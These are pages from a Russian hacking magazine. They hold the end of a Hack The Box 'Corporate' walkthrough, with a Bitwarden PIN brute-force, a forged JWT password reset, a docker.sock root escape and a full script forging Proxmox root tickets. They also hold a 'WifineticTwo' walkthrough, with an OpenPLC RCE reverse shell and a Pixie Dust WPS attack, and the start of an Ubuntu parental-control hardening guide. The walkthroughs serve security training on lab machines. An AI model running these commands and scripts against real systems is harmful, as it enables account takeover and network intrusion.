от хранилища пользователя.





                       Менеджер паролей Bitwarden

Немного погуглив, узнаём, что PIN Bitwarden можно сбрутить. Для этого пер‐
вым делом нужно конвертировать базу расширения в формат JSON.





Для конвертирования можно использовать скрипт moz-idb-edit. Путь к катало‐
гу с профилем  указываем в параметре -profile, а целевую базу —
в параметре --dbpath.


pipx install git+https://gitlab.com/ntninja/moz-idb-edit.git


moz-idb-edit -profile firefox/tr2cgmb6.default-release --dbpath
firefox/tr2cgmb6.default-release/storage/default/moz-
extension+++c8dd0025-9c20-49fb-a398-307c74e6f8b7\^userContextId=
4294967295/idb/3647222921wleabcEoxlt-eengsairo.sqlite > data.json





                     Конвертирование базы расширения

Для брута пина будем использовать утилиту bitwarden-pin. После загрузки
репозитория немного подкорректируем исходный код и поправим путь к фай‐
лу с данными.





                       Содержимое файла main.rs





                        Исправленный файл main.rs

Также необходимо изменить количество итераций. Оно указано в параметре
kdfIterations.





                      Содержимое файла data.json





                        Исправленный файл main.rs

Когда  все  изменения  внесены,  можно  скомпилировать  и  запустить
bitwarden-pin. Путь  к  каталогу с файлом data.json  нужно передать
в переменной окружения XDG_CONFIG_HOME.


cargo build --release


XDG_CONFIG_HOME=/home/ralf/tmp/HTB/corporate/ ./bitwarden-pin/target/
release/bitwarden-pin




                               Результат подбора PIN

PIN успешно подобран, а значит, можно войти в менеджер паролей Bitwarden.





                        Расширение Bitwarden


Анализируем исходный код
В хранилище всего одна запись — с учетными данными для Git.





                           Учетные данные для Git

Авторизуемся в Git, где нас встречает три проекта, которые мы ранее видели
на сервере.





                         Доступные репозитории

Потратив некоторое время, я нашел в одном из коммитов удаленный секрет
JWT.





                      История коммитов package.json

Нужно проверить этот секрет. Перейдем к одному из сервисов, из Burp Proxy
возьмем токен JWT и попробуем применить найденный секрет для его рас‐
шифровки. Работать с JWT будем с помощью jwt_tool.





                          Главная страница сервиса


python3 jwt_tool.py 'eyJhb.....UZm-I' -C -p
09cb527651c4bd385483815627e6241bdf40042a





                            Результат проверки секрета

Секрет валидный, а значит, можно сгенерировать и подписать свой токен
JWT.
  На сайте используется механизм SSO (технология единого входа), а зна‐
чит, изменение пароля через сайт приведет к изменению пароля в системе.
За функцию смены пароля отвечает эндпоинт /reset-password. Исходный
код обработчика можно найти в проекте Corporate-SSO.
   После проверки JWT (строка 108) происходит получение таких парамет‐
ров, как имя пользователя, старый и новый пароли (строки 113–120). Флаг
requireCurrentPassword (строка 122) показывает, что можно отключить
проверку текущего пароля при установке нового. Если все проверки прой‐
дены, вызывается функция updateLogin.





                      Содержимое файла src/app.ts

Внутри функции updateLogin выполняются запросы к базе LDAP. Сначала
для получения данных, а потом для изменения. Перед изменением пароля
проверяется и роль пользователя, так как сисадминам смена пароля зап‐
рещена (строки 114–117).





                      Содержимое файла src/utils.ts

Теперь проверим, какие данные содержит токен JWT. Для этого его нужно
передать jwt_tool без параметров.


python3 jwt_tool.py 'eyJhbGciOiJIUzI.....w6_rGbRUZm-I'





                        Содержимое токена JWT




                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ
      HTB CORPORATE
             ЭКСПЛУАТИРУЕМ SELF-XSS,
             БРУТИМ PIN ОТ BITWARDEN
               И ПОДДЕЛЫВАЕМ JWT




Помимо  данных  пользователя и  его  ролей,  в  токене  указана  опция
requireCurrentPassword. Если ее установить как false, можно будет изме‐
нить пароль без знания текущего.


JWT
Теперь нужно выбрать пользователя, для которого сгенерируем токен и сме‐
ним пароль. Раз пароли сисадминов менять нельзя, можем использовать
одного из инженеров, так как им доступна запись в docker.sock. Это даст
нам возможность повысить привилегии.
   Отобрать пользователей с нужной ролью можно все тем же способом
в Burp Intruder.





                       Пользователи с ролью engineer




                       Пользователи с ролью sysadmin

Для создания токена JWT используем удобный сервис JWT.io. Заполняем
поля данными инженера gayle.graham, устанавливаем секрет JWT и задаем
поле requireCurrentPassword как false.


{
 "id": 5025 ,
 "name": "Gayle",
 "surname": "Graham",
 "email": "gayle.graham@corporate.htb",
 "roles": [
   "engineer"
 ],
 "requireCurrentPassword": false,
 "iat": 1707897653,
 "exp": 1707984053
}





                          Создание токена JWT

Сгенерированный токен нужно установить в куки через хранилище браузера.
Затем можно перейти к странице изменения пароля.





                               Запись токена





                Форма изменения пароля пользователя

Как можешь  заметить,  в форме  изменения пароля  есть  только поля
для нового пароля. Давай зададим 123456789 и проверим с помощью
NetExec.


nxc ssh 10.9.0.4 -u gayle.graham -p 123456789




                           Проверка учетных данных

Пароль установлен, а значит, можно получить сессию пользователя.



                    Сессия пользователя gayle.graham


engineer → root
Так как текущий пользователь имеет право записи на docker.sock, мы
можем повысить привилегии до рута. Для этого нам потребуется создать
свой образ Docker. Поскольку на хосте без прав рута этого не сделать, соз‐
дадим его в своей локальной системе, а затем сохраним в архив.


sudo docker pull alpine
sudo docker save alpine > docker_alpine.tar

После переноса архива на удаленный хост восстановим образ из архива.


docker load < docker_alpine.tar





                        Создание образа Docker

А теперь через создание контейнера переходим в привилегированный кон‐
текст.


docker run -ti --privileged --net= host --pid= host --ipc= host --volume
 /:/host alpine chroot /host





                            Получение сессии root


root → corporate sysadmin
Имея полные привилегии, примонтируем удаленный ресурс NSF и посмотрим
его содержимое.


mkdir /mnt/r
mount.nfs 10.9.0.1:/ /mnt/r/ -r -o nolock





                        Содержимое ресурса NFS

В директории /home/guests/ расположены домашние каталоги пользовате‐
лей. Так как мы уже определили сисадминов, с помощью su перелогинимся
от имени одного из них и просмотрим содержимое домашнего каталога.





            Содержимое домашнего каталога stevie.rosenbaum

Там находим приватный ключ SSH, с которым можно авторизоваться на хосте
Corporate от имени пользователя sysadmin.





                        Приватный ключ пользователя




                      Сессия пользователя sysadmin


ХОСТ CORPORATE

Proxmox
Снова собираем данные в системе с помощью LinPEAS и находим бэкап:


/var/backups/pve-host-2023_04_15-16_09_46.tar.gzs





                             Найденные бэкапы

Загружаем архив на локальный хост для анализа.


scp -i id_rsa sysadmin@10.9.0.1:/var/backups/pve-host-2023_04_15-16_
09_46.tar.gz ./
tar -xf pve-host-2023_04_15-16_09_46.tar.gz

Дело в том, что, если функция резервного копирования Proxmox хоть раз
использовалась, архив с резервной копией будет содержать ключ аутен‐
тификации etc/pve/priv/authkey.key.





                     Содержимое файла authkey.key

Как сказано в исследовании Star Labs, этим ключом подписывается тикет
PVEAuthCookie. То есть, имея ключ аутентификации, можно сгенерировать
тикет для пользователя root@pam, тем самым получив рутовый доступ.
  На основе скрипта из статьи напишем генератор тикета PVEAuthCookie.


import argparse, requests, logging, json, socket, ssl, urllib.parse,
re, time, subprocess, base64, tarfile, io, tempfile, urllib3, sys


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


PROXIES = {}
logging.basicConfig(format='%(asctime)s - %(message)s', level=logging
.INFO)



def generate_ticket(authkey_bytes, username='root@pam', time_offset=-
30):
    timestamp = hex(int(time.time()) + time_offset)[2:].upper()
    # plaintext = f'PMG:{username}:{timestamp}'
    plaintext = f'PVE:{username}:{timestamp}'


    authkey_path = tempfile.NamedTemporaryFile(delete=False)
    logging.info(f'writing authkey to {authkey_path.name}')
    authkey_path.write(authkey_bytes)
    authkey_path.close()


    txt_path = tempfile.NamedTemporaryFile(delete=False)
    logging.info(f'writing plaintext to {txt_path.name}')
    txt_path.write(plaintext.encode('utf-8'))
    txt_path.close()


    logging.info(f'calling openssl to sign')
    sig = subprocess.check_output(['openssl', 'dgst', '-sha1', '-sign
', authkey_path.name, '-out', '-', txt_path.name])
    sig = base64.b64encode(sig).decode('latin-1')


    ret = f'{plaintext}::{sig}'
    logging.info(f'generated ticket for {username}: {ret}')


    return ret


if __name__ == '__main__':
    if (len(sys.argv) != 4) :
        print(f'Use: {sys.argv[0]} [priv_key] [target_url] [
target_user]')
        exit(0)


    authkey_bytes = open(sys.argv[1], "rb").read()
    new_ticket = generate_ticket(authkey_bytes, username=sys.argv[3])
    logging.info('veryfing ticket')
    req = requests.get(sys.argv[2], headers={'Cookie': f'
PVEAuthCookie={new_ticket}'}, proxies=PROXIES, verify=False)
    res = req.content.decode('utf-8')
    verify_re = re.compile('UserName: '(.*?)',\n\
s+CSRFPreventionToken:')
    verify_result = verify_re.findall(res)
    logging.info(f'current user: {verify_result[0]}')
    logging.info(f'Cookie: PVEAuthCookie={urllib.parse.quote_plus(
new_ticket)}')

С этим скриптом получаем тикет.


python3 exploit.py etc/pve/priv/authkey.key https://10.9.0.1:8006/
'root@pam'





                            Создание тикета

Применяем тикет к cookie через хранилище браузера и получаем доступ
к Proxmox.





                          Главная страница Proxmox

Выбираем сервер из списка и открываем веб‑терминал с полными привиле‐
гиями.





                           Флаг рута

Машина захвачена!
ВЗЛОМ





Сегодня мы начнем с необычной  атаки:
нашей целью будет интегрированная среда
разработки  софта  для  индустриальных
программируемых   логических   контрол‐
леров (ПЛК). Мы получим доступ к хосту             RalfHacker                                                                                             hackerralf8@gmail.com
через RCE-уязвимость и затем взломаем
беспроводную точку доступа.


Наша цель — получение прав суперпользователя на машине WifineticTwo
с учебной площадки Hack The Box. Уровень сложности задания — средний.


           WARNING

                            Подключаться к машинам с HTB рекомендуется
                            только через VPN. Не делай этого с компьютеров,
                        где есть важные для тебя данные, так как ты ока‐
                        жешься в общей сети с другими участниками.



РАЗВЕДКА

Сканирование портов
Добавляем IP-адрес машины в /etc/hosts:


10.10.11.7    wifinetictwo.htb

И запускаем сканирование портов.

Справка: сканирование портов
Сканирование портов — стандартный первый шаг при любой атаке. Он поз‐
воляет атакующему узнать, какие службы на хосте принимают соединение.
На основе этой информации выбирается следующий шаг к получению точки
входа.
   Наиболее известный инструмент для сканирования — это Nmap. Улучшить
результаты его работы ты можешь при помощи следующего скрипта:


 #!/bin/bash
 ports=$(nmap -p- --min-rate= 500 $1 | grep ^[0-9] | cut -d '/' -f 1 |
 tr '\n' ',' | sed s/,$//)
 nmap -p$ports -A $1


Он действует в два этапа. На первом производится обычное быстрое ска‐
нирование, на втором — более тщательное сканирование, с использованием
имеющихся скриптов (опция -A).





                             Результат работы скрипта

Сканер нашел два открытых порта:
 • 22 — служба OpenSSH 8.2p1;
 • 8080 — веб‑сервер Werkzeug 1.0.1 на Python 2.

По логам Nmap можно сделать вывод, что сайт не самописный, то есть
используется какая‑то CMS. Приступим к его изучению.





                           Главная страница сайта


ТОЧКА ВХОДА

Перед нами форма авторизации в системе OpenPLC. Дальше пути два: поп‐
робовать  учетные данные по умолчанию  и, если не  получится, искать
информацию об уязвимостях и готовые эксплоиты для используемой сис‐
темы.





                Поиск учетных данных по умолчанию в Google

Находим дефолтные логин и пароль openplc:openplc и запросто авторизу‐
емся с ними в OpenPLC.





                           Главная страница сайта

А теперь проверим, есть ли для обнаруженной технологии готовые экспло‐
иты.





                         Поиск эксплоитов в Google

Первая же ссылка из Google — на сайт Exploit-DB. Приведенный эксплоит
для OpenPLC 3 при прохождении аутентификации способен выполнить про‐
извольный код (реверс‑шелл).

Справка: реверс-шелл
Обратный шелл — это подключение, которое активирует атакуемая машина,
а мы принимаем и таким образом подключаемся к ней, чтобы выполнять
команды от лица пользователя, запустившего шелл. Для приема соединения
необходимо создать на локальной машине listener, то есть «слушатель».


Скачиваем скрипт и смотрим, как с ним обращаться. Можем просто запустить
его и запросить справку параметром -h.





                          Справка help эксплоита

Нужно задать URL, логин, пароль, а также  IP и порт для подключения
реверс‑шелла. Все это мы можем предоставить.
   Запускаем листенер:


pwncat-cs -lp 4321

Затем выполняем скрипт, передав ему URL сервиса (параметр -u), учетные
данные (параметры -l и -p), а также адрес и порт, где работает листенер.


python3 49803.py  -u http://10.10.11.7:8080/ -l openplc -p openplc -i
 10.10.16.143 -r 4321





                          Выполнение эксплоита

Но скрипт выдает ошибку, а в листенере новая сессия так и не появилась.
Попробуем разобраться, что пошло не так.


ТОЧКА ОПОРЫ

Открываем исходный код эксплоита. Нужно понять, почему он не работает,
хотя версия OpenPLC подвержена уязвимости. В коде поочередно вызыва‐
ются функции auth, injection и connection. Судя по выводу эксплоита,
при запуске этапы аутентификации и инъекции проходят без ошибок. Проб‐
лемы же начинаются в функции connection.





                        Исходный код эксплоита

В строках 85–92 никаких особых действий не происходит — обычный запрос
к статическим страницам, которые доступны на сайте. Поэтому будем искать
сбои в коде после 93-й строки.





                        Исходный код эксплоита

Здесь   выполняется   GET-запрос   к   URI,   заданному   в   параметре
compile_program. Я посмотрел его определение, и мне стало интересно, что
же это за страница — /compile-program?file=681871.st. Но если просто
открыть этот URL в браузере, никакого вывода мы не получим. Однако такой
файл появится в списке программ на странице /programs.





                     Содержимое страницы Programs

Тут есть и другой файл — blank_program.st, который был загружен доволь‐
но давно. Видимо, подразумевается файл, который должен находиться в сис‐
теме по умолчанию, поэтому я изменил код, указав вместо 681871.st файл
blank_program.st.


compile_program = options.url + '/compile-program?file=blank_program.
st'





                        Исходный код эксплоита

Проверяем, работает ли листенер, и заново запускаем эксплоит. В этот раз
он выдал ту же самую ошибку, но сессия в pwncat прилетела.


python3 49803.py  -u http://10.10.11.7:8080/ -l openplc -p openplc -i
 10.10.16.143 -r 4321

Мы получаем шелл и можем забрать флаг пользователя.





                       Флаг пользователя


ЛОКАЛЬНОЕ ПОВЫШЕНИЕ ПРИВИЛЕГИЙ

Сессия, которую мы получили, уже работает в контексте рута, но флага рута
на этой машине нет. Значит, для решения лаборатории нужно продвижение
на другой хост. Машина Wifinetic была связана со взломом точки Wi-Fi, так что
можно предположить, что наша WifineticTwo тоже затрагивает эту тему. Что ж,
давай копать в этом направлении.
   Первым делом командой ifconfig получим информацию о сетевых
интерфейсах.





                   Информация о сетевых интерфейсах

В  списке  есть  интерфейс  для  беспроводного  соединения —  wlan0.
С помощью команды iw dev можно не только получить сведения о текущем
соединении, названии сети и номере канала Wi-Fi, но и обнаружить точки
доступа, указав параметр scan.


iw dev wlan0 scan





                  Результат сканирования беспроводных сетей

Нам  доступна  точка  plcrouter  (параметр  SSID),  которая  использует
не самый надежный механизм аутентификации — WPS (Wi-Fi Protected Setup).
Этот стандарт разработан для упрощения настройки беспроводной сети
и позволяет подключиться к сети с помощью восьмизначного ПИН‑кода (при
этом восьмая цифра — это чек‑сумма). Но протокол WPS уязвим к несколь‐
ким атакам, самая популярная из которых — Pixie Dust.
   Одно из специальных сообщений (M3), которое роутер отправляет клиенту,
содержит особые хеши E-Hash1 и E-Hash2. Эти хеши вычисляются сле‐
дующим образом.


E-Hash1 = HMAC-SHA-256(authkey) (E-S1 | PSK1 | PKE | PKR)
E-Hash2 = HMAC-SHA-256(authkey) (E-S2 | PSK2 | PKE | PKR)

 • E-S1 и E-S2 — случайные 128-битные числа;
 • PSK1 — первые четыре цифры WPS PIN, PSK2 — остальные четыре цифры
  WPS PIN;
 • PKE — публичный ключ роутера;
 • PKR — публичный ключ клиента.

Таким образом, неизвестны значения E-S1 и E-S2, PSK1 и PSK2. При этом
если мы узнаем числа E-S1 и E-S2, то сможем легко подобрать PIN. Многие
роутеры используют в качестве этих параметров постоянные числа, а некото‐
рые и вовсе значение 0, что делает возможным быстрый подбор WPS PIN.
  Для выполнения атаки воспользуемся скриптом OneShot, которому нужно
передать BSSID точки доступа.


python3 oneshot.py -i wlan0 -b 02:00:00:00:01:00 -K





                             Результат работы скрипта

В течение пяти минут получаем валидный PIN и пароль от точки доступа. Что‐
бы  подключиться  к  Wi-Fi  из  терминала,  будем  использовать  утилиту
wpa_supplicant, но сперва для нее нужно сделать файл с настройками.
А для этого есть другая утилита — wpa_passphrase.


wpa_passphrase plcrouter 'NoWWEDoKnowWhaTisReal123!' > plcrouter.
config
wpa_supplicant -B -c plcrouter.config -i wlan0




                       Подключение к точке доступа

Хоть мы и подключились к точке доступа, но IP-адрес нам не дали.





                   Информация о сетевых интерфейсах

Назначим адрес самостоятельно. Используем стандартную для роутеров Wi-
Fi-сеть 192.168.1.0.


ifconfig wlan0 192.168.1.22 netmask 255.255.255.0





                   Информация о сетевых интерфейсах

Осталось подключиться к роутеру и забрать флаг. Пароль у нас не запросят.


ssh root@192.168.1.1





                           Флаг рута

Роутер захвачен!
ПРИВАТНОСТЬ





Если  у тебя есть дети, ты  знаешь, что
в наше время к обычному набору родитель‐
ских обязанностей неизбежно добавляется
еще одна: вытащить чадо из омута компь‐
ютерных  игр и  «Тиктока»,  заставив  его              xak745                                                                                            i@brumbad.ru
учиться. Обычные программы родительско‐
го  контроля  неэффективны,  поэтому мы
решим эту задачу самостоятельно — пра‐
вильно  настроив  операционную  систему
на примере Ubuntu Linux.


Подростки по природе своей весьма пытливы и целеустремленны, если дело
не касается вопросов образования. Но главное — они имеют запас времени,
существенно превосходящий твой. В какой‑то момент юный падаван заяв‐
ляет, что ему для учебы нужен компьютер. Ага, думаешь ты, знаем мы эту уче‐
бу. Сам в свое время «учился» ночи напролет, владелец палатки с игровыми
СD сменил аж три мерседеса с твоих заносов.
   Большинство домашних компов, как известно, работают под управлением
Windows, а с родительским контролем в этой системе все неоднозначно.
Подобные программы либо стоят денег, либо не работают совсем. В 10-й
винде что‑то можно было наколхозить с помощью Software Restriction Policies
(SRP), но в Windows 11 этот инструмент выпилили: по мнению разработчиков,
эта функция лишняя для домашних сетей.
   Вывод напрашивается очевидный: нужно приучать юное поколение к Linux
в виде самого популярного дистрибутива — Ubuntu. А пока наследники будут
искать в гугле, как обойти возведенные тобою препятствия, волей‑неволей
научатся работать с этой системой.


        WWW

                            Если тебе неохота после каждого катаклизма вос‐
                            станавливать работу системы  вручную, можно
                            воспользоваться  готовым  набором  сценариев
                          safews4lin, который предназначен для настройки
                      рабочей   станции  под  управлением  Ubuntu
                        в качестве учебной машины.



ВОЗМОЖНЫЕ УГРОЗЫ И ИХ НЕЙТРАЛИЗАЦИЯ

В информационной безопасности  проектирование  технических решений
начинается с построения модели нарушителя. Поскольку нарушителя мы зна‐
ем буквально с пеленок, это добавляет определенные штрихи как к его
поведению, так и к возможным мерам противодействия. Например, угроза
физического вскрытия ноутбука эффективнее всего блокируется организа‐
ционными мерами. Нарушители предупреждены, что ноутбук фиксирует факт
снятия крышки (на самом деле нет, но об этом, кроме тебя, никто не знает),
и если что, то ой. В самом крайнем случае можно засверлить пару винтов
на нижней крышке: чтобы вскрыть ноут, их придется разворотить до конца. А с
учетом того, что руки нынешней молодежи заточены под чатики и тиктоки, эту
угрозу можно считать незначительной.
   Ограничить использование флешек у нас возможности нет вообще. Не в
силу архитектурных особенностей системы, а потому, что они нужны для уче‐
бы. То есть ребенок, скорее всего, притащит на съемных носителях домой
все что угодно, включая эксплоиты, игры и прочую дребедень. С этим придет‐
ся  смириться  как с неизбежным злом,  поскольку,  кроме  развлечений,
молодая поросль занята программированием, а там без запуска своего соф‐
та никуда.
   Добавляет сложностей и невысокий уровень  критического мышления
у субъектов защиты. Если в описании программы будет написано «взломщик
всего»,   «зарабатывальщик   биткоинов   не   приходя   в   сознание»
или «минус‑зиродей‑эксплоит», это с высокой вероятностью будет скачано
и запущено.


BIOS

Пароль на вход в BIOS нужен обязательно. Иначе «злоумышленники» просто
воткнут загрузочную флешку и поправят что надо, не отходя от  кассы.
Рекомендую запретить в настройках выбор загрузочного носителя, порядок
загрузки должен быть прибит гвоздями (записать болванку или раскатать заг‐
рузочную флешку и воткнуть ее в привод много ума не надо).


GRUB

Пароль на конфигурацию загрузчика тоже обязателен. Параметр init=/bin/
bash — первое, что посоветуют школьнику в интернете. А так советчики слег‐
ка подрастеряют авторитет. Recovery mode тоже прячь под пароль, иначе все
произойдет лишь чуть медленнее (а может, и быстрее). Для ускорения про‐
цедуры настройки есть сценарий bin/init.grub.sh, который создаст поль‐
зователя и разрешит ему беспарольную загрузку по умолчанию.


ПАРОЛИ

Важный момент по поводу паролей. Очевидно, что они должны быть слож‐
ными и трудно подбираемыми. На всякий случай лучше записать их на бумаж‐
ку и хранить где‑нибудь в укромном месте. Можешь, конечно, запихнуть лис‐
ток в сейф, но тогда он рискует стать объектом повышенного интереса и пос‐
традает уже не только ноутбук. Мой совет — отнеси бумажку с паролями
на работу. Случись что, сослуживцы зачитают по телефону. Вариант, что
нарушитель позвонит твоему коллеге и выманит пароль методом социальной
инженерии, пока не рассматриваем. Искренне надеюсь, что такой уровень
компетенции будет достигнут к моменту, когда заборы уже станут не нужны.
   Если пароль статичный, он должен быть длинным. Подросток, у которого
имеется масса времени и есть цель, способен месяцами подбирать пароль
по фрагменту, который он запомнил, подглядывая через плечо. И никакие
задержки ввода его не остановят. Lockout after failed attempts вообще должен
быть отключен: сам же потом будешь смотреть на надпись «Учетная запись
заблокирована» и гадать, это ты пароль забыл или тебе помогли.


КОНТРОЛЬ ДОСТУПА В ИНТЕРНЕТ

Ах, этот чудесный интернет. В юности мне казалось, что люди, получившие
доступ ко всем знаниям мира, смогут теперь учиться всегда и везде, вести
философские беседы с лучшими умами со всех концов света, изучать инос‐
транные языки, общаясь с их носителями. Однако что‑то пошло не так.
   Наша задача — направить любознательность ребенка в конструктивное
русло, по возможности ограничив ему доступ к учебным материалам уровня
«как правильно запихать „Ментос“ в пепси‑колу». Вопрос — каким образом?
   Наиболее распространенный подход в виде списка «неправильных сай‐
тов» совершенно непригоден в реальной жизни. Это только в маркетинговых
материалах хорошо смотрится фраза «Наши специалисты при поддержке
искусственного  интеллекта  регулярно  пополняют  список  нежелательных
ресурсов». За кадром остается то, что у производителей «буллщит‑контента»
(я тоже умею в молодежный сленг) миллион рук и работают они круглосуточ‐
но, причем на совесть. А у экспертов рук всего две причем обе — из извес‐
тного места, и вот они работают всего лишь сорок часов в неделю, причем
за зарплату некрупного насекомого. Это битва, проигранная с самого начала.
   Потому самый надежный и экономный путь — открываем доступ только
к заведомо правильному. Указанный способ в детстве успешно испытали
на авторе этих строк, и я не могу сказать о нем ничего плохого. Ресурсы
со всякой мурой по странному совпадению концентрируются за бугром,
поэтому первый и самый очевидный шаг — ограничение доступа рунетом.
Отправная точка — перечень сетей зоны RU. Автор подобрал некую базу,
сохранил ее в файл data/runet.db и начал с нее.
   Ограничение  исходящего  трафика  настраивается  через  -j  DROP
при помощи комбинации ipset/iptables для членов группы safeusers
с GID 8425. Применение ipset обусловлено тем, что списки весьма велики и,
если попытаться их запихать в iptables, это даст прям существенную про‐
садку в быстродействии. Создаем список подсетей, например ipv4:


ipset create allow_v4 hash:net family inet hashsize 32768 maxelem
128000 counters comment
ipset add allow_v4 5.167.151.0/24 packets 0 bytes 0 comment "runet.
db"
...

Выполняем проверку адреса назначения на совпадение в iptables:


iptables -A OUTPUT -m owner --gid-owner 8425 --suppl-groups -j safe_
output
iptables -A safe_output -d 127.0.0.0/24 -j ACCEPT
iptables -A safe_output -m set --match-set deny_v4 dst -j DROP
iptables -A safe_output -m set --match-set allow_v4 dst -j ACCEPT
iptables -A safe_output -j LOG --log-prefix "[SAFEWS]"
iptables -A safe_output -j DROP

Все  это  хозяйство  инициализируем  при помощи  пакетов  iptables-
persistent и netfilter-persistent. Второй за счет системы плагинов поз‐
воляет подгружать в том числе и правила ipset, если сценарий инициали‐
зации положить, например, в /usr/share/netfilter-persistent/plugins.
d/10-ipset.
   Теперь включаем нужного пользователя в группу usermod -aG safeusers
rediska, и в учебное время — уже никаких ютубов и прочих излишеств.
Команды netfilter-persistent  flush и netfilter-persistent  start,
запускаемые из крона, позволяют в нужные моменты взводить и снимать
ограничения.
  Для ускорения процедуры можно выполнить от имени рута сценарий bin/
init.network.sh из комплекта safews4lin, который все сделает сам (для
Ubuntu 20.04 точно).


             INFO

                        Важный момент: по умолчанию доступа к локалке
                       на  компе  не  будет. Не  давая  ребенку  воз‐
                      можность выйти в локалку, ты сохранишь девс‐
                           твенность  своего  китайского  роутера, не  пат‐
                           ченного со времен династии Цинь, и NAS’а того
                    же уровня защищенности.



ПРИОТКРЫВАЕМ ОКНО В АМЕРИКУ

«Что это за вой несется с болот? Вы слышите, Холмс?» Это кто‑то плачет
по  Stack  Overflow и  гуглу,  с  которых он  копипастил решения  задач
по  информатике. Не будем  делать  вид,  что сами  пользуемся  только
Яндексом, расширим нашу схему прокси‑сервером, который в дополнение
к runet.db будет давать доступ по белому списку доменов. Очевидный кан‐
дидат — Squid.
  На базе «Сквида» интернет‑затейники сооружают самые разнообразные
конструкции, в том числе с контент‑фильтрацией, но это подразумевает внед‐
рение в схему MITM-прокси. Если судить по документации, указанный метод
позволяет настраивать фильтры на «плохие слова» и все такое. Но автор пока
не подобрал варианта, который ограничивался бы простой проксей.
   Схема будет стандартная, а не прозрачная, так как последняя требует
установки в клиентское приложение самоподписанных сертификатов, что
не всегда возможно. В моем случае камнем преткновения стал кастомный
дистрибутив  VSCode,  который  от  таких  поворотов  судьбы  перестал
обновляться и цепляться к системе обучения. Из‑за этого же пришлось отка‐
заться от ALT Linux как базы для проекта и делать все на «Убунте».
   Как показала практика, подопечные начинают тащить откуда попало раз‐
ные браузеры, в том числе с поддержкой Tor и прочих безобразий. В общем,
самый простой метод работает так: говори, куда конкретно тебе нужен дос‐
туп, мы его добавляем, сам прописывай прокси в настройках, и будет тебе
счастье. Squid.conf, идущий в составе проекта, в ключевой части достаточ‐
но прост:


acl blacklist url_regex -i "/etc/squid/lists/blacklist"
acl whitelist url_regex -i "/etc/squid/lists/whitelist"
acl whiteip dst "/etc/squid/lists/whiteip"
…
http_access deny blacklist
http_access allow whitelist
http_access allow whiteip
http_access deny all

Футболим все, что в черном списке (сделано в первую очередь для сайтов,
которые проходят по acl whiteip), открываем сайты по белому списку (плю‐
шевый вариант есть в проекте safews4lin) и разрешаем выход в рунет
(используется копия базы runet.db, которую «Сквид» вполне бодро жует).


ДОБАВЛЯЕМ НЕМНОГО НЕДОИНТЕЛЛЕКТА

Иногда выясняется, что список сетей рунета кривой, неполный или нужен
доступ к сети без Squid. В связи с этим я добавил модуль аналитики по whois-
записям. Whois database — это некая глобальная база данных, в которую
регистраторы вносят записи о доменах и сетях. Поэтому о любом адресе
можно получить довольно объемную справку, в которой указаны параметры,
связанные с владельцем диапазона. В частности, номер автономной системы
и имя оператора. Это весьма удобно. Например, добавив в список правил
вот такие записи:


## На каждую автономку выполняется проверка условий из списка
## Если есть хотя бы одно совпадение, доступ разрешается
validate:
    - d['asn_country_code'] == "RU"
    - d['asn_description'] == "CANONICAL-AS, GB"

при попытке стукнуться на сайт «Убунты» служба iptracker отрапортует
что‑то подобное:


[get_whois]: External lookup for 185.125.188.61 -> 185.125.188.0/23
-> CANONICAL-AS, GB -> GB
[check_ip]: external db requested for 185.125.188.61
[validate_whois]: 185.125.188.0/23 validated with d['asn_
description'] == "CANONICAL-AS, GB"

Это позволяет не забивать голову структурой, стоящей за обеспечением
функционирования крупных сайтов, и разрешать доступ сразу целиком к под‐
сетям. Так как в конфиге указываются Python-выражения, то можно запилить
хоть вызов Алисы, главное, чтобы выражение было в состоянии разыме‐
новаться в True/False.
   Настраивается все в одно движение вызовом сценария bin/init.whois.
sh из комплекта скриптов safews4lin.


AUTOSSH

Отдельная задача — организовать удаленный доступ к машине, которая
сидит за NAT’ом. Представь, ты на работе, раздается звонок, и реки слез про‐
ливаются в трубку: «Срочно нужен админский пароль! Объяснить не могу, сам
все настрою и, чесслово, ничего больше трогать не буду».
   Обратный туннель с твоей машины на домашнюю позволит избавить чадо
от риска натрудить ручки. Если есть желание, можно использовать готовые
решения, но то, что я пробовал, иногда очень странно себя ведет, поэтому
пришлось взять за основу посконный autossh.
  За настройку этой функции отвечает сценарий bin/init.autossh.sh,
который генерит ключевую пару и подвешивает systemd-unit следующего
вида:


[Unit]
Description=AutoSSH tunnel to Ubuntu-VPS
After=network-online.target


[Service]
Environment="AUTOSSH_GATETIME=0"
ExecStart=/usr/bin/autossh -M 0 -o "ServerAliveInterval 30" -o
"ServerAliveCountMax 3" -o "ExitOnForwardFailure=yes" -i $IDENT -N
-R 8422:localhost:22 $dst


[Install]
WantedBy=multi-user.target

По факту появления сети машина форвардит порт 8422 с твоей тачки, име‐
ющей белый IP, на localhost:22. Теперь ты можешь заходить и настраивать
что угодно. Не забудь на внешней машине поставить шелл для туннельного
пользователя /bin/true, просто на всякий случай.


OTP

Если ты думаешь, что длинный и сложный пароль подобрать невозможно, то
ты просто незнаком со всей глубиной человеческого коварства. Сюжет: тебя
срочно вызывают в сынарник детскую — надо ввести пароль и поставить
очень важную и нужную программу. Ноут стоит не на столе, а почему‑то
на первом этаже двухъярусной кровати, и набирать надо именно там. Нет,
трогать компьютер нельзя, иначе все сломается.
  Не будем  упираться,  наберем, нам  не  жалко. Пишем  сообщение
в WhatsApp, что операция прошла успешно, и тут у вас над головой что‑то
тренькает. Ой, а там к полке второго этажа  случайно прилип телефон
в режиме съемки видео... К сожалению, «злоумышленники» забыли выключить
звук, что и сорвало вполне рабочий план.
   Короче, рано или поздно пароль ты спалишь. На помощь нам придет OTP.
Аппаратный токен — плохой вариант, его можно на время одолжить (ты же
не будешь носить его все время при себе), подснять ПИН‑код — и привет.
А вот одноразовые пароли через какой‑нибудь Google Authenticator избавят
тебя от этой проблемы.
   Только важный момент: если твой телефон — проходной двор, приложе‐
ние для генерации лучше держать на другом устройстве. Автонастройка
с использованием скрипта bin/init.otp.sh добавит в /etc/pam.d/common-
auth следующие строчки:


auth [default= 1 success=ignore] pam_succeed_if.so quiet user ingroup
otp
auth required pam_google_authenticator.so

Это включит требование двухфакторной аутентификации для членов группы
otp. Останется только сгенерить затравку, выполнив под нужным пользовате‐
лем команду google-authenticator, и дело в шляпе.


КОНТРОЛЬ УЩЕРБА

На случай если «нарушитель» все‑таки добрался до административных при‐
вилегий, нам нужен признак состоявшейся компрометации. На начальном
уровне вполне достаточно иметь etckeeper, который накроет типовые сце‐
нарии типа «добавлю в init.d запуск нетката с башем».
  При этом, понятное дело, придется фиксировать хеш последнего коммита,
